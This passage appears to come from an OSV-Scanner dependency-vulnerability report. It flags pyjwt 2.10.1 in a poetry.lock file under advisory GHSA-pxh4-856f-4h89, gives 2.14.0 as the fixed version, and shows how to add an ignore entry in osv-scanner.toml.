lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | pyjwt | 2.10.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-pxh4-856f-4h89 | pyjwt | 2.14.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-pxh4-856f-4h89\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
